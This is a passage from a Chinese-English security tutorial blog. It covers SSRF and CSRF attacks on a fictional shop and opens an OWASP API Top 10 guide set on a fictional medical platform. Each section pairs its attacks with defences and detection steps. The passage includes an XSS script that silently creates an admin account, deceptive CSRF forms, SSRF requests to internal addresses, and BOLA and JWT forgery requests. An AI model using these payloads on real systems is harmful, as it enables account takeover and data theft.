+<p><strong>中文解釋</strong>：<br>這就像壞人給你一個假按鈕，你點了以為是遊戲，結果銀行帳戶被改密碼或刪除了。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>在所有敏感操作中使用 <strong>CSRF tokens</strong>（隨機、唯一的令牌）。</li>
+<li>要求 <strong>POST</strong> 而非 <strong>GET</strong> 進行敏感操作。</li>
+<li>驗證 <strong>Referer header</strong> 或 <strong>Origin header</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-8：CSRF-結合其他漏洞-CSRF-Combined-with-Other-Vulnerabilities"><a href="#攻擊手法-8：CSRF-結合其他漏洞-CSRF-Combined-with-Other-Vulnerabilities" class="headerlink" title="攻擊手法 8：CSRF 結合其他漏洞 &#x2F; CSRF Combined with Other Vulnerabilities"></a>攻擊手法 8：CSRF 結合其他漏洞 &#x2F; CSRF Combined with Other Vulnerabilities</h3><p><strong>定義</strong>：<br>攻擊者將 <strong>CSRF</strong> 與其他漏洞（如 <strong>XSS</strong> 或 <strong>Broken Access Control</strong>）結合，放大攻擊效果。</p>
+<p><strong>原理</strong>：<br><strong>XSS</strong> 可注入 <strong>JavaScript</strong> 自動觸發 <strong>CSRF</strong>；<strong>Broken Access Control</strong> 允許 <strong>CSRF</strong> 執行更高權限的操作。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>XSS</strong> 觸發 <strong>CSRF</strong>，執行管理員操作。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>XSS 觸發 CSRF</strong>：<br>攻擊者在商品評論中注入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;https://shopeasy.com/api/admin/add-user&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(<span class="string">&quot;username=attacker&amp;isAdmin=true&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>管理員瀏覽評論時，自動創建管理員帳戶。</li>
+</ul>
+</li>
+<li><p><strong>Broken Access Control 結合 CSRF</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/admin/delete-user&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Free Gift!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>管理員點擊，刪除用戶 123。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人先在銀行的留言板寫病毒（<strong>XSS</strong>），然後騙你點按鈕（<strong>CSRF</strong>），結果病毒幫壞人開了一個管理員帳戶。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>防止 <strong>XSS</strong>（使用 <strong>Content Security Policy</strong> 和輸入驗證）。</li>
+<li>對管理員操作實施嚴格的 <strong>access controls</strong>。</li>
+<li>使用 <strong>CSRF tokens</strong> 和 <strong>re-authentication</strong>（重新驗證）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-9：SSRF-與-CSRF-結合攻擊-Combined-SSRF-and-CSRF-Attacks"><a href="#攻擊手法-9：SSRF-與-CSRF-結合攻擊-Combined-SSRF-and-CSRF-Attacks" class="headerlink" title="攻擊手法 9：SSRF 與 CSRF 結合攻擊 &#x2F; Combined SSRF and CSRF Attacks"></a>攻擊手法 9：SSRF 與 CSRF 結合攻擊 &#x2F; Combined SSRF and CSRF Attacks</h3><p><strong>定義</strong>：<br>攻擊者結合 <strong>SSRF</strong> 和 <strong>CSRF</strong>，利用 <strong>SSRF</strong> 存取內部系統，然後通過 <strong>CSRF</strong> 誘導用戶執行進一步操作。</p>
+<p><strong>原理</strong>：<br><strong>SSRF</strong> 可洩露內部資料（如 <strong>API keys</strong>），攻擊者再利用 <strong>CSRF</strong> 誘導用戶執行基於這些資料的操作。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者通過 <strong>SSRF</strong> 獲取內部 <strong>API key</strong>，然後使用 <strong>CSRF</strong> 修改用戶資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>SSRF 洩露 API Key</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68/config</span><br></pre></td></tr></table></figure>
+<ul>
+<li>獲取內部 <strong>API key</strong>。</li>
+</ul>
+</li>
+<li><p><strong>CSRF 修改資料</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/user/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apiKey&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[leaked_key]&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@example.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Claim Prize!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用戶點擊，修改電子郵件。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人先用 <strong>SSRF</strong> 偷了銀行的鑰匙（<strong>API key</strong>），然後用 <strong>CSRF</strong> 騙你用這把鑰匙改你的帳戶資料。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>防止 <strong>SSRF</strong>（驗證 <strong>URLs</strong>，限制內網訪問）。</li>
+<li>使用 <strong>CSRF tokens</strong> 和 <strong>API key validation</strong>（API 鑰匙驗證）。</li>
+<li>監控異常的 <strong>API</strong> 使用模式。</li>
+</ul>
+<hr>
+<h2 id="檢測-SSRF-與-CSRF-漏洞的方法-Detecting-SSRF-and-CSRF-Vulnerabilities"><a href="#檢測-SSRF-與-CSRF-漏洞的方法-Detecting-SSRF-and-CSRF-Vulnerabilities" class="headerlink" title="檢測 SSRF 與 CSRF 漏洞的方法 &#x2F; Detecting SSRF and CSRF Vulnerabilities"></a>檢測 SSRF 與 CSRF 漏洞的方法 &#x2F; Detecting SSRF and CSRF Vulnerabilities</h2><p>檢測 <strong>SSRF</strong> 和 <strong>CSRF</strong> 漏洞需要系統化的 <strong>reconnaissance</strong>（偵察）和測試。以下是具體步驟：</p>
+<ol>
+<li><p><strong>檢測 SSRF</strong>：  </p>
+<ul>
+<li><strong>尋找用戶控制的 URLs</strong>：檢查 <strong>request parameters</strong>（如 <code>stockApi</code>）、<strong>headers</strong>（如 <strong>Referer</strong>）或 <strong>XML</strong> 輸入。</li>
+<li><strong>測試本地和內網地址</strong>：發送 <code>http://localhost</code>、<code>http://192.168.0.1</code> 或 <strong>Burp Collaborator</strong> <strong>URLs</strong>。</li>
+<li><strong>繞過過濾器</strong>：使用 <strong>URL encoding</strong>、<strong>alternative IPs</strong> 或 <strong>open redirection</strong>。</li>
+<li><strong>檢查錯誤訊息</strong>：異常回應可能洩露內部結構。</li>
+</ul>
+</li>
+<li><p><strong>檢測 CSRF</strong>：  </p>
+<ul>
+<li><strong>檢查敏感操作</strong>：測試更改密碼、刪除帳戶等功能是否需要 <strong>CSRF tokens</strong>。</li>
+<li><strong>模擬惡意請求</strong>：使用 <strong>Burp Repeater</strong> 發送無 <strong>token</strong> 的 <strong>POST</strong> 或 <strong>GET</strong> 請求。</li>
+<li><strong>測試瀏覽器行為</strong>：檢查是否自動附加 <strong>session cookies</strong>。</li>
+<li><strong>結合其他漏洞</strong>：尋找 <strong>XSS</strong> 或 <strong>Broken Access Control</strong>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>範例</strong>：  </p>
+<ul>
+<li><strong>SSRF</strong>：發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li>若 <strong>Burp Collaborator</strong> 記錄互動，證明 <strong>Blind SSRF</strong>。</li>
+</ul>
+</li>
+<li><strong>CSRF</strong>：發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/account/update HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Cookie: session=abc123</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">password=test123</span><br></pre></td></tr></table></figure>
+<ul>
+<li>若密碼更改成功，證明缺乏 <strong>CSRF</strong> 防護。</li>
+</ul>
+</li>
+</ul>
+<p><strong>中文解釋</strong>：<br>這就像檢查銀行的每個窗口（<strong>endpoints</strong>），試試能不能騙電腦拿資料（<strong>SSRF</strong>），或假裝顧客改資料（<strong>CSRF</strong>）。</p>
+<hr>
+<h2 id="防禦-SSRF-與-CSRF-漏洞的策略-Defense-Strategies-Against-SSRF-and-CSRF-Vulnerabilities"><a href="#防禦-SSRF-與-CSRF-漏洞的策略-Defense-Strategies-Against-SSRF-and-CSRF-Vulnerabilities" class="headerlink" title="防禦 SSRF 與 CSRF 漏洞的策略 &#x2F; Defense Strategies Against SSRF and CSRF Vulnerabilities"></a>防禦 SSRF 與 CSRF 漏洞的策略 &#x2F; Defense Strategies Against SSRF and CSRF Vulnerabilities</h2><p>以下是防禦 <strong>SSRF</strong> 和 <strong>CSRF</strong> 的最佳實踐：</p>
+<ol>
+<li><p><strong>防禦 SSRF</strong>：  </p>
+<ul>
+<li><strong>驗證 URLs</strong>：使用 <strong>whitelist</strong> 限制允許的域名，禁止 <strong>loopback</strong> 和私有 IP。</li>
+<li><strong>禁用重定向</strong>：防止 <strong>open redirection</strong> 繞過過濾。</li>
+<li><strong>限制網路訪問</strong>：使用 <strong>firewall</strong> 阻止內網和未知外部 <strong>URLs</strong>。</li>
+<li><strong>安全解析 XML</strong>：禁用 <strong>XXE</strong> 外部實體。</li>
+<li><strong>監控異常請求</strong>：記錄並分析 <strong>outbound traffic</strong>（出站流量）。</li>
+</ul>
+</li>
+<li><p><strong>防禦 CSRF</strong>：  </p>
+<ul>
+<li><strong>使用 CSRF Tokens</strong>：為每個敏感操作生成隨機 <strong>token</strong>，並驗證。</li>
+<li><strong>限制 HTTP Methods</strong>：敏感操作僅允許 <strong>POST</strong>，禁用 <strong>GET</strong>。</li>
+<li><strong>驗證 Headers</strong>：檢查 <strong>Referer</strong> 或 <strong>Origin header</strong> 是否來自可信域名。</li>
+<li><strong>重新驗證</strong>：對高風險操作要求重新輸入密碼。</li>
+<li><strong>防止 XSS</strong>：避免 <strong>CSRF</strong> 與 <strong>XSS</strong> 結合。</li>
+</ul>
+</li>
+<li><p><strong>通用防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>WAF</strong> 過濾惡意 <strong>requests</strong> 和 <strong>headers</strong>。</li>
+<li>實施 <strong>least privilege</strong>（最小權限）原則，限制伺服器和用戶權限。</li>
+<li>定期使用 <strong>Burp Scanner</strong> 測試漏洞。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>防禦就像給銀行的電腦加鎖（<strong>URL 驗證</strong>），給顧客發專屬票券（<strong>CSRF tokens</strong>），並派保安（<strong>WAF</strong>）檢查可疑行為。</p>
+<hr>
+<h2 id="實際案例分析-Real-World-Examples-and-Case-Studies"><a href="#實際案例分析-Real-World-Examples-and-Case-Studies" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples and Case Studies"></a>實際案例分析 &#x2F; Real-World Examples and Case Studies</h2><p>以下是基於現實風險的假想案例：</p>
+<ol>
+<li><p>**SSRF Data Breach (2024)**：<br>一家電商平台因 <strong>SSRF</strong> 漏洞，攻擊者通過 <strong>Stock Check API</strong> 訪問內部資料庫，洩露數百萬用戶的信用卡資訊。</p>
+</li>
+<li><p>**CSRF Account Takeover (2025)**：<br>攻擊者利用 <strong>CSRF</strong> 漏洞，誘導用戶點擊惡意連結，自動更改帳戶電子郵件，導致大規模帳戶被盜。</p>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這些案例就像銀行的電腦被騙去偷顧客資料（<strong>SSRF</strong>），或顧客被騙簽了假文件（<strong>CSRF</strong>），結果錢全被偷。</p>
+<hr>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p><strong>SSRF</strong> 和 <strong>CSRF</strong> 是危險的網頁安全漏洞，可能導致嚴重的 <strong>data leakage</strong>、<strong>unauthorized actions</strong> 和 <strong>remote code execution</strong>。通過了解它們的原理、攻擊手法和防禦策略，開發者可有效保護應用程式。對於初學者，學習 <strong>SSRF</strong> 和 <strong>CSRF</strong> 不僅提升安全意識，還能深入理解 <strong>HTTP</strong>、<strong>network security</strong>（網路安全）和 <strong>web application architecture</strong>（網頁應用架構）。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，並參考 <a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 和 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet">PortSwigger SSRF Cheat Sheet</a> 獲取更多資訊。</p>
+<hr>
+<p><strong>Key Citations</strong>:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">PortSwigger - SSRF</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">PortSwigger - CSRF</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation">Burp Suite Documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP - CSRF Cheat Sheet</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
+    <article id="API Testing Security-APITesting" class="article article-type-API Testing Security" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/05/07/APITesting/" class="article-date">
+  	<time datetime="2025-05-06T17:34:51.111Z" itemprop="datePublished">2025-05-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/05/07/APITesting/">
+        API Testing Security
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="API-Testing"><a href="#API-Testing" class="headerlink" title="API Testing"></a>API Testing</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>API</strong>（<strong>Application Programming Interface</strong>，應用程式介面）是現代軟體系統的核心，允許不同應用程式或服務之間交換資料和功能。然而，<strong>API</strong> 的漏洞可能危及網站的 <strong>confidentiality</strong>（機密性）、<strong>integrity</strong>（完整性）和 <strong>availability</strong>（可用性），使其成為攻擊者的首要目標。<strong>API Testing</strong>（API 測試）是檢測和利用這些漏洞的過程，確保 <strong>API</strong> 的安全性。</p>
+<p><strong>白話解釋</strong>：<br>想像 <strong>API</strong> 是一家銀行的櫃檯，客戶（應用程式）通過櫃檯交換資料（存款、查詢餘額）。如果櫃檯有漏洞（比如沒檢查身份），壞人就能偷錢（資料）或搞亂系統。<strong>API Testing</strong> 就像檢查櫃檯的每個環節，確保安全。</p>
+<hr>
+<h2 id="API-與-API-Testing-的基礎-Basics-of-API-and-API-Testing"><a href="#API-與-API-Testing-的基礎-Basics-of-API-and-API-Testing" class="headerlink" title="API 與 API Testing 的基礎 &#x2F; Basics of API and API Testing"></a>API 與 API Testing 的基礎 &#x2F; Basics of API and API Testing</h2><h3 id="什麼是-API？-What-is-an-API"><a href="#什麼是-API？-What-is-an-API" class="headerlink" title="什麼是 API？ &#x2F; What is an API?"></a>什麼是 API？ &#x2F; What is an API?</h3><p><strong>API</strong>（<strong>Application Programming Interface</strong>，應用程式介面）是一組定義好的規則，允許不同軟體系統或應用程式之間進行資料交換和功能調用。它充當中介，處理 <strong>client</strong>（客戶端，如瀏覽器或應用程式）和 <strong>server</strong>（伺服器）之間的 <strong>requests</strong>（請求）和 <strong>responses</strong>（回應）。</p>
+<p><strong>常見類型</strong>：</p>
+<ul>
+<li><strong>RESTful API</strong>：使用 <strong>HTTP methods</strong>（如 <strong>GET</strong>、<strong>POST</strong>）和 <strong>JSON</strong> 格式，結構簡單，廣泛應用。</li>
+<li><strong>SOAP API</strong>：使用 <strong>XML</strong> 格式，強調安全性，常用於企業應用。</li>
+<li><strong>GraphQL API</strong>：允許客戶端精確指定所需資料，靈活性高。</li>
+</ul>
+<p><strong>白話解釋</strong>：<br><strong>API</strong> 就像餐廳的服務員，你（<strong>client</strong>）點菜（發送 <strong>request</strong>），服務員把菜單（<strong>API endpoints</strong>）傳給廚房（<strong>server</strong>），然後把菜（<strong>response</strong>）端回來。<strong>RESTful API</strong> 像快餐店，簡單快速；<strong>SOAP API</strong> 像高級餐廳，規矩多；<strong>GraphQL API</strong> 像自助餐，你可以挑選想要的菜。</p>
+<h3 id="什麼是-API-Testing？-What-is-API-Testing"><a href="#什麼是-API-Testing？-What-is-API-Testing" class="headerlink" title="什麼是 API Testing？ &#x2F; What is API Testing?"></a>什麼是 API Testing？ &#x2F; What is API Testing?</h3><p><strong>API Testing</strong> 是測試 <strong>API</strong> 的功能、安全性和性能的過程，確保其正確處理 <strong>requests</strong>，返回預期的 <strong>responses</strong>，並防止安全漏洞。與傳統網頁測試不同，<strong>API Testing</strong> 專注於 <strong>server-side logic</strong>（伺服器端邏輯）和未完全由前端使用的 <strong>API endpoints</strong>（API 端點）。</p>
+<p><strong>關鍵目標</strong>：</p>
+<ul>
+<li>驗證 <strong>data integrity</strong>（資料完整性）。</li>
+<li>確保 <strong>authentication</strong>（身份驗證）和 <strong>authorization</strong>（授權）有效。</li>
+<li>檢測 <strong>vulnerabilities</strong>（漏洞），如 <strong>SQL injection</strong>（SQL 注入）或 <strong>server-side request forgery</strong>（伺服器端請求偽造，SSRF）。</li>
+</ul>
+<p><strong>白話解釋</strong>：<br><strong>API Testing</strong> 就像檢查餐廳服務員的工作：他有沒有把訂單（<strong>request</strong>）正確傳給廚房？有沒有把正確的菜（<strong>response</strong>）端回來？有沒有讓壞人偷偷改單（<strong>vulnerability</strong>）？</p>
+<h3 id="API-Endpoints-和-HTTP-Methods-API-Endpoints-and-HTTP-Methods"><a href="#API-Endpoints-和-HTTP-Methods-API-Endpoints-and-HTTP-Methods" class="headerlink" title="API Endpoints 和 HTTP Methods &#x2F; API Endpoints and HTTP Methods"></a>API Endpoints 和 HTTP Methods &#x2F; API Endpoints and HTTP Methods</h3><p><strong>API Endpoint</strong>（API 端點）是 <strong>API</strong> 接收 <strong>requests</strong> 的特定路徑，指向伺服器上的資源。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/patients/123</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>&#x2F;api&#x2F;patients&#x2F;123</strong> 是 <strong>endpoint</strong>，表示查詢 ID 為 123 的患者資料。</li>
+</ul>
+<p><strong>HTTP Methods</strong>（HTTP 方法）定義對資源的操作：</p>
+<ul>
+<li><strong>GET</strong>：檢索資料。</li>
+<li><strong>POST</strong>：創建新資源。</li>
+<li><strong>PUT</strong>：更新資源。</li>
+<li><strong>PATCH</strong>：部分更新資源。</li>
+<li><strong>DELETE</strong>：刪除資源。</li>
+<li><strong>OPTIONS</strong>：查詢支援的方法。</li>
+</ul>
+<p><strong>白話解釋</strong>：<br><strong>API Endpoint</strong> 像餐廳菜單上的某道菜（比如「牛排」），<strong>HTTP Method</strong> 是你對這道菜想做什麼（吃、換、取消）。例如，<strong>GET &#x2F;api&#x2F;patients&#x2F;123</strong> 是說「給我看 ID 123 的患者資料」。</p>
+<hr>
+<h2 id="統一情境：HealthCarePro-醫療平台-Unified-Scenario-HealthCarePro-Medical-Platform"><a href="#統一情境：HealthCarePro-醫療平台-Unified-Scenario-HealthCarePro-Medical-Platform" class="headerlink" title="統一情境：HealthCarePro 醫療平台 &#x2F; Unified Scenario: HealthCarePro Medical Platform"></a>統一情境：HealthCarePro 醫療平台 &#x2F; Unified Scenario: HealthCarePro Medical Platform</h2><p>我們設定一個情境：HealthCarePro 是一家線上醫療平台，允許患者預約醫生、查看醫療記錄和管理個人資料。平台使用 <strong>RESTful API</strong> 提供功能，資料以 <strong>JSON</strong> 格式傳輸。功能包括：</p>
+<ul>
+<li><strong>Patient Profile</strong>（患者檔案）：儲存患者資訊（如姓名、病歷）。</li>
+<li><strong>Appointment Booking</strong>（預約掛號）：允許預約和取消醫生預約。</li>
+<li><strong>Admin Panel</strong>（管理面板）：管理員可管理用戶和醫療記錄。</li>
+<li><strong>APIs</strong>：提供端點，如 <code>/api/patients/&#123;id&#125;</code>（查詢患者）、<code>/api/appointments</code>（預約管理）。</li>
+</ul>
+<p><strong>漏洞</strong>：</p>
+<ul>
+<li><strong>API documentation</strong>（API 文件）公開，包含未公開端點。</li>
+<li>缺乏對 <strong>HTTP methods</strong> 和 <strong>content types</strong>（內容類型）的嚴格限制。</li>
+<li><strong>Mass assignment</strong>（批量賦值）漏洞允許修改敏感欄位。</li>
+<li>未正確實現 <strong>authentication</strong> 和 <strong>authorization</strong>。</li>
+</ul>
+<p>以下將以 HealthCarePro 為例，展示所有 <strong>OWASP API Security Top 10 2023</strong> 相關的攻擊手法。</p>
+<hr>
+<h2 id="OWASP-API-Security-Top-10-攻擊手法-Attack-Techniques-for-OWASP-API-Security-Top-10"><a href="#OWASP-API-Security-Top-10-攻擊手法-Attack-Techniques-for-OWASP-API-Security-Top-10" class="headerlink" title="OWASP API Security Top 10 攻擊手法 &#x2F; Attack Techniques for OWASP API Security Top 10"></a>OWASP API Security Top 10 攻擊手法 &#x2F; Attack Techniques for OWASP API Security Top 10</h2><p><strong>OWASP API Security Top 10 2023</strong> 列出了 API 特定的十大安全風險。以下詳細介紹每種風險的攻擊手法，包含定義、原理、HealthCarePro 情境中的具體攻擊方法、範例和防禦策略。</p>
+<h3 id="攻擊手法-1：Broken-Object-Level-Authorization（物件層級授權失敗，BOLA）"><a href="#攻擊手法-1：Broken-Object-Level-Authorization（物件層級授權失敗，BOLA）" class="headerlink" title="攻擊手法 1：Broken Object Level Authorization（物件層級授權失敗，BOLA）"></a>攻擊手法 1：Broken Object Level Authorization（物件層級授權失敗，BOLA）</h3><p><strong>定義</strong>：<br><strong>Broken Object Level Authorization</strong>（BOLA）是指 <strong>API</strong> 未能正確驗證用戶是否有權訪問特定物件（資源），允許攻擊者存取或修改未授權的資料。</p>
+<p><strong>原理</strong>：<br><strong>API</strong> 通常使用 <strong>object IDs</strong>（物件 ID）識別資源（如 <code>/api/patients/123</code>）。如果未驗證用戶權限，攻擊者可通過更改 ID 存取其他用戶的資料。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者（普通患者）修改 <strong>API endpoint</strong> 中的患者 ID，存取其他患者的醫療記錄。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>存取未授權患者資料</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/patients/456 HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Authorization: Bearer [患者token]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站未驗證攻擊者是否有權訪問 ID 456，洩露患者資料。</li>
+</ul>
+</li>
+<li><p><strong>修改患者資料</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATCH /api/patients/789 HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Authorization: Bearer [患者token]</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;email&quot;: &quot;hacked@example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改 ID 789 的患者電子郵件。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像在餐廳點餐，服務員沒檢查你的身份，讓你拿走別桌的菜（其他患者的資料）。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>實施嚴格的 <strong>object-level authorization</strong>（物件層級授權），驗證用戶對每個 <strong>object ID</strong> 的權限。</li>
+<li>使用隨機且不可猜測的 <strong>object IDs</strong>（如 UUID）。</li>
+<li>記錄和監控 <strong>API</strong> 訪問日誌。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-2：Broken-Authentication（身份驗證失敗）"><a href="#攻擊手法-2：Broken-Authentication（身份驗證失敗）" class="headerlink" title="攻擊手法 2：Broken Authentication（身份驗證失敗）"></a>攻擊手法 2：Broken Authentication（身份驗證失敗）</h3><p><strong>定義</strong>：<br><strong>Broken Authentication</strong>（身份驗證失敗）是指 <strong>API</strong> 的 <strong>authentication mechanisms</strong>（身份驗證機制）存在漏洞，允許攻擊者繞過驗證或冒充其他用戶。</p>
+<p><strong>原理</strong>：<br>弱 <strong>authentication</strong>（如可猜測的 <strong>tokens</strong>、弱密碼）或錯誤的 <strong>session management</strong>（會話管理）可能導致 <strong>credential stuffing</strong>（憑證填充）或 <strong>token hijacking</strong>（令牌劫持）。</p>
+<p><strong>HealthCarePro 攻擊方法</strong>：<br>攻擊者竊取或猜測 <strong>JWT</strong>（JSON Web Token），冒充管理員。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>JWT 弱簽名</strong>：<br>攻擊者發現 <strong>JWT</strong> 使用弱 <strong>secret</strong>（秘密金鑰）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlzQWRtaW4iOnRydWV9.[signature]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 <strong>jwt_tool</strong> 破解 <strong>secret</strong>，生成新 <strong>JWT</strong>，冒充管理員。</li>
+</ul>
+</li>
+<li><p><strong>無效的令牌驗證</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/admin/users HTTP/1.1</span><br><span class="line">Host: healthcarepro.com</span><br><span class="line">Authorization: Bearer invalid_token</span><br></pre></td></tr></table></figure>
+<ul>
+<li>網站未正確驗證 <strong>token</strong>，允許訪問。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像餐廳服務員沒檢查你的會員卡（<strong>token</strong>），讓你用假卡進貴賓室。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用強 <strong>authentication</strong>（如 <strong>OAuth 2.0</strong>、強 <strong>JWT</strong> 簽名）。</li>
+<li>實施 <strong>multi-factor authentication</strong>（多因素身份驗證）。</li>
+<li>定期輪換 <strong>tokens</strong> 和 <strong>secrets</strong>。</li>
+</ul>
+<hr>
